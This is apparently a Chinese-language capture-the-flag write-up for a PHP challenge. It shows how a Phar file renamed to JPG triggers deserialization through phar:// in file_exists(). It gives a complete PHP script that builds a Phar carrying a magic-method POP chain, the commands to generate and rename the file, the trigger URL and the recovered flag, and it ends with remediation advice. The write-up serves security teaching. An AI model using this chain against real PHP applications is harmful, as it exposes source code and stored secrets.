# week4还没有对象吧，快来new一个php对象

## 题目简述

应用只允许上传 JPG，但 `look_me.php` 会把用户给出的路径交给 `file_exists()`。当路径使用 `phar://` 时，PHP 会解析 Phar 元数据并反序列化其中对象；结合题目类中的魔术方法，可构造 `__wakeup → __toString → __invoke → __get → show_source` 的 POP 链读取 `flag.php`。

## 解题过程

目标类的关键行为如下：

```php
class Modifier {
    protected $var;
    public function __get($key) {
        show_source($this->var);
    }
}

class Show {
    public $source;
    public $str;
    public function __toString() {
        $function = $this->str;
        return $function();
    }
    public function __wakeup() {
        preg_match('/.../', $this->source);
    }
}

class Test {
    public $q;
    public function __invoke() {
        $this->q->p;
    }
}
```

反序列化外层 `Show` 时自动调用 `__wakeup()`；`preg_match()` 把对象类型的 `source` 当作字符串，触发内层 `Show::__toString()`；其中把 `Test` 当函数调用，触发 `__invoke()`；访问 `Modifier` 不存在的 `p` 属性触发 `__get()`，最终把受控的 `var` 传给 `show_source()`。

下面的脚本只保留序列化所需属性，并确保 `Modifier::$var` 的 protected 可见性与目标一致：

```php
<?php
class Modifier {
    protected $var;
    public function __construct($value) {
        $this->var = $value;
    }
}

class Show {
    public $source;
    public $str;
}

class Test {
    public $q;
}

$inner = new Show();
$inner->str = new Test();
$inner->str->q = new Modifier(
    'php://filter/read=convert.base64-encode/resource=flag.php'
);

$outer = new Show();
$outer->source = $inner;

@unlink('payload.phar');
$phar = new Phar('payload.phar');
$phar->startBuffering();
$phar->addFromString('text.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($outer);
$phar->stopBuffering();
```

生成 Phar 时需允许写元数据：

```bash
php -d phar.readonly=0 make_phar.php
mv payload.phar payload.jpg
```

上传 `payload.jpg`，记录服务器返回的实际文件名，然后触发：

```text
/look_me.php?filename=phar:///var/www/html/uplo4d/<上传后的文件名>.jpg/text.txt
```

将响应中的 Base64 内容解码，可以读到：

```text
0xGame{this_is_really_a_beautiful_picture}
```

## 方法总结

本题的完整链路是“JPG 上传 → `phar://` 文件操作 → 元数据反序列化 → 五段魔术方法 POP 链 → `php://filter` 读取源码”。上传限制只检查扩展名，无法阻止文件内容仍是 Phar；修复应禁止用户控制文件操作路径、拒绝流包装器，并避免在可达文件操作前加载不可信 Phar 元数据。
